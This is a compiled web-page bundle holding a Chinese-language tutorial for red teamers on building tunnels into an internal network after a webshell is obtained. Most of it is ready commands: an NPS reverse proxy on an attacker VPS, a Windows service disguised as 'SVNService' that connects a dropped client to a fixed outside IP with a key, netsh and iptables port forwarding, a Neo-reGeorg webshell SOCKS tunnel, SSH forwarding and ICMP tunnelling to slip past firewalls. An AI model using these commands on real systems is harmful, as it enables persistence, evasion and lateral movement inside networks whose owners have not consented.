(window.webpackJsonp=window.webpackJsonp||[]).push([[59],{830:function(s,t,a){"use strict";a.r(t);var e=a(105),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"网络连通性测试"}},[s._v("网络连通性测试 "),a("a",{staticClass:"header-anchor",attrs:{href:"#网络连通性测试"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("当我们千辛万苦通过外网边界的一个入口点拿到Webshell后，想要在内网横向拓展战果第一件事情就是要构建内网通道，构建通道的方法网上也有很多五花八门的方法有老到被杀软干掉的lcx还有配置复杂的FRP，本文是作者自己实战中觉得更加方便实用的一些方法。例如目标能出网时用的搭建和操作都极其简单的NPS（反向代理），以及目标不能出网时用的Neo-reGeorg（正向代理）")])]),s._v(" "),a("p",[a("strong",[s._v("ICMP")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ping")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("114.114")]),s._v(".114.114 -n "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Windows")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ping")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("114.114")]),s._v(".114.114 -c "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#Linux")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("HTTP")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://www.baidu.com\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("DNS")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nslookup")]),s._v(" baidu.com\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("仅DNS出网可直接上CS-DNS上线")]),s._v(" "),a("p",[a("strong",[s._v("读取本机代理")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("REG QUERY "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看代理配置情况,连接它的代理试试")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("是否存在Nginx反向代理")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#1、找到Nginx目录")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2、查看配置文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#3、例如某次实战中发现正反向都代理不出去，查看配置文件发现了nginx反代，直接连接公网IP代理的3389端口")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("h1",{attrs:{id:"反向代理"}},[s._v("反向代理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#反向代理"}},[s._v("#")])]),s._v(" "),a("p",[s._v("服务器能"),a("strong",[s._v("出网")]),s._v("的情况下，反向代理可以穿透防火墙（需要上传文件）")]),s._v(" "),a("blockquote",[a("p",[s._v("1、CobaltStrike 自带的Socks代理")]),s._v(" "),a("p",[s._v("2、NPS（简单 自带Web管理页面、稳定跨平台、支持多级代理）")])]),s._v(" "),a("h2",{attrs:{id:"搭建nps"}},[s._v("搭建NPS "),a("a",{staticClass:"header-anchor",attrs:{href:"#搭建nps"}},[s._v("#")])]),s._v(" "),a("p",[s._v("1、下载nps服务端到自己的VPS（以Linux-Centos为例）https://ehang-io.github.io/nps")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" ./nps "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#安装")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nps start\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#启动")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nps stop\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#停止")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nps reload\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#服务端配置文件重载")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("2、修改配置文件（敏感信息改掉） "),a("code",[s._v("/etc/nps/conf/nps.conf")])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",[s._v("名称")]),s._v(" "),a("th",[s._v("含义")])])]),s._v(" "),a("tbody",[a("tr",[a("td",[s._v("web_port")]),s._v(" "),a("td",[s._v("web管理端口")])]),s._v(" "),a("tr",[a("td",[s._v("web_password")]),s._v(" "),a("td",[s._v("web界面管理密码")])]),s._v(" "),a("tr",[a("td",[s._v("web_username")]),s._v(" "),a("td",[s._v("web界面管理账号")])]),s._v(" "),a("tr",[a("td",[s._v("auth_key")]),s._v(" "),a("td",[s._v("web api密钥")])]),s._v(" "),a("tr",[a("td",[s._v("public_vkey")]),s._v(" "),a("td",[s._v("客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式")])]),s._v(" "),a("tr",[a("td",[s._v("auth_crypt_key")]),s._v(" "),a("td",[s._v("获取服务端authKey时的aes加密密钥，16位")])])])]),s._v(" "),a("p",[a("strong",[s._v("创建系统服务")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sc create svnservice "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("binpath")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\Users\\Public\\Videos\\setup.exe -server=111.173.114.77:8091 -vkey=zkxcn35bhkzit2kt -type=tcp"')]),s._v("  "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("displayname")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"SVNService"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("depend")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" Tcpip "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("start")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" auto\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("sc start svnservice\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"正向转发"}},[s._v("正向转发 "),a("a",{staticClass:"header-anchor",attrs:{href:"#正向转发"}},[s._v("#")])]),s._v(" "),a("h2",{attrs:{id:"windows-netsh-端口转发-双网卡用"}},[s._v("Windows netsh 端口转发（双网卡用） "),a("a",{staticClass:"header-anchor",attrs:{href:"#windows-netsh-端口转发-双网卡用"}},[s._v("#")])]),s._v(" "),a("p",[a("code",[s._v("netsh")]),s._v("仅支持TCP协议， 适用于"),a("strong",[s._v("双网卡")]),s._v("服务器")]),s._v(" "),a("p",[s._v("连接外网6666端口，就是连接到内网目标上面的3389。")]),s._v(" "),a("p",[a("strong",[s._v("启动转发")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看现有规则")]),s._v("\nnetsh interface portproxy show all\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#添加转发规则")]),s._v("\nnetsh interface portproxy "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("set")]),s._v(" v4tov4 "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("listenaddress")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("外网IP "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("listenport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6666")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("connectaddress")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("内网IP "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("connectport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("取消转发")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#删除转发规则")]),s._v("\nnetsh interface portproxy delete v4tov4 "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("listenport")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("6666")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#xp需要安装ipv6")]),s._v("\nnetsh interface ipv6 "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("install")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("h2",{attrs:{id:"linux-iptables-端口转发-高权限用"}},[s._v("Linux iptables 端口转发（高权限用） "),a("a",{staticClass:"header-anchor",attrs:{href:"#linux-iptables-端口转发-高权限用"}},[s._v("#")])]),s._v(" "),a("p",[s._v("1、编辑配置文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("vi")]),s._v(" /etc/sysctl.conf\n\tnet.ipv4.ip_forward "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#开启IP转发")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("2、关闭服务")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" iptables stop\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("3、配置规则")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#需要访问的内网地址：10.1.1.11（Windows）")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#内网边界web服务器：192.168.100.100（Linux）")]),s._v("\niptables -t nat -A PREROUTING --dst "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".100.100 -p tcp --dport "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" -j DNAT--to-destination "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".1.11:3389\n\niptables -t nat -A POSTROUTING --dst "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.1")]),s._v(".1.11 -p tcp --dport "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3389")]),s._v(" -j SNAT --to-source "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".100.100\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("4、保存并重启服务")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" iptables save "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("service")]),s._v(" iptables start\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这时访问Web服务器的3389就能登录到内网机器的桌面了。")]),s._v(" "),a("h2",{attrs:{id:"neo-regeorg-端口复用"}},[s._v("Neo-reGeorg 端口复用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#neo-regeorg-端口复用"}},[s._v("#")])]),s._v(" "),a("p",[s._v("配合Webshell，复用目标的Web服务端口开一个Socks5代理隧道。")]),s._v(" "),a("p",[s._v("https://github.com/L-codes/Neo-reGeorg")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python3 neoreg.py generate -k password\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#生成服务端")]),s._v("\npython3 neoreg.py -k password -u http://xx/tunnel.php\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#在本地建立Socks5代理")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h1",{attrs:{id:"linux-ssh隧道-高权限用"}},[s._v("Linux SSH隧道（高权限用） "),a("a",{staticClass:"header-anchor",attrs:{href:"#linux-ssh隧道-高权限用"}},[s._v("#")])]),s._v(" "),a("p",[s._v("SSH一般是允许通过防火墙的，而且传输过程是加密的")]),s._v(" "),a("p",[a("strong",[s._v("本地转发（正向）")])]),s._v(" "),a("p",[s._v("在"),a("code",[s._v("中转VPS")]),s._v("上执行以下命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -CfNg -L "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("VPS监听端口"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("目标内网IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("目标端口"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("（root@目标外网Web服务器，会要求输入密码）"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -CfNg -L "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8080")]),s._v(":10.1.1.3:3389 root@100.100.1.100\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#VPS上查看8090端口是否已经连接")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("netstat")]),s._v(" -tulnp "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"8090"')]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#连接目标内网服务器的远程桌面")]),s._v("\nVPS-IP:8090\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br")])]),a("p",[s._v("SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口；")]),s._v(" "),a("p",[s._v("在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口。")]),s._v(" "),a("p",[a("strong",[s._v("远程转发（反向）")])]),s._v(" "),a("p",[s._v("在"),a("code",[s._v("Web服务器")]),s._v("上执行如下命令")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -CfNg -R "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("VPS的端口"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("目标内网IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(":"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("目标端口"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("（root@VPS-IP，会要求输入密码）"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -CfNg -R "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8090")]),s._v(":10.1.1.3:3389 root@192.168.0.1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("访问"),a("code",[s._v("VPS")]),s._v("的8090端口，即可连接内网数据库服务器的3389")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("VPS-IP:8090\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("所有访问"),a("code",[s._v("VPS")]),s._v("的8090端口的流量都会通过SSH隧道传输到数据库服务器的3389端口")]),s._v(" "),a("h1",{attrs:{id:"icmp加密隧道"}},[s._v("ICMP加密隧道 "),a("a",{staticClass:"header-anchor",attrs:{href:"#icmp加密隧道"}},[s._v("#")])]),s._v(" "),a("p",[s._v("适用场景 ：特殊环境下"),a("code",[s._v("ICMP")]),s._v("流量允许出网，穿透防火墙")]),s._v(" "),a("p",[s._v("工具："),a("a",{attrs:{href:"https://github.com/jamesbarlow/icmptunnel",target:"_blank",rel:"noopener noreferrer"}},[s._v("icmptunnel"),a("OutboundLink")],1),s._v(" （只能在Linux上使用）")]),s._v(" "),a("p",[a("strong",[s._v("安装服务端")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("git")]),s._v(" clone https://github.com/jamesbarlow/icmptunnel.git\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" icmptunnel/\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("make")]),s._v("\nsysctl -w net.ipv4.icmp_echo_ignore_all"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#禁用自带的ICMP，两端都要")]),s._v("\n./icmptunnel -s \t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#服务端以root用户监听")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ctrl-z"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\t\t\t\t\t\t\t\t\t\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("bg")]),s._v("\t\t\t\t\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#后台挂起")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ifconfig")]),s._v(" tun0 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),s._v(".0.1 netmask "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("255.255")]),s._v(".255.0"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#给隧道接口分配一个 IP 地址")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br")])]),a("p",[a("strong",[s._v("客户端连接")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./icmptunnel "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("server-IP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("ctrl-z"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("bg")]),s._v("\t\t\t\t\t\t\t\t\t\t\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#后台挂起")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ifconfig")]),s._v(" tun0 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.0")]),s._v(".0.2 netmask "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("255.255")]),s._v(".255.0"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#给隧道接口分配一个 IP 地址")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("现在，我们拥有一个端到端基于 ICMP 数据包的隧道，测试SSH连接")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" root@10.0.0.1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("当然也可以把远程服务器当作一个加密的 SOCKS 代理：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" -D "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8080")]),s._v(" -N root@10.0.0.1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("浏览器设置代理 socks://10.0.0.1:8080")]),s._v(" "),a("h1",{attrs:{id:"边界代理"}},[s._v("边界代理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#边界代理"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("遵循三个原则")])]),s._v(" "),a("ol",[a("li",[a("strong",[s._v("稳定性")]),s._v("（主要用于扫描）{ 支持高并发、自动断线重连 }")]),s._v(" "),a("li",[a("strong",[s._v("安全性")]),s._v("（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }")]),s._v(" "),a("li",[a("strong",[s._v("健壮性")]),s._v("   { 支持多种协议方式、最好支持插件定制 }")])]),s._v(" "),a("p",[a("strong",[s._v("Windows连接")])]),s._v(" "),a("p",[s._v("Proxifier全局代理（"),a("a",{attrs:{href:"https://pan.wgpsec.org",target:"_blank",rel:"noopener noreferrer"}},[s._v("狼盘下载"),a("OutboundLink")],1),s._v("）")]),s._v(" "),a("p",[a("strong",[s._v("Linux连接")])]),s._v(" "),a("p",[s._v("使用"),a("a",{attrs:{href:"https://github.com/rofl0r/proxychains-ng",target:"_blank",rel:"noopener noreferrer"}},[s._v("proxychains"),a("OutboundLink")],1),s._v("，配合MSF使用")])])}),[],!1,null,null,null);t.default=n.exports}}]);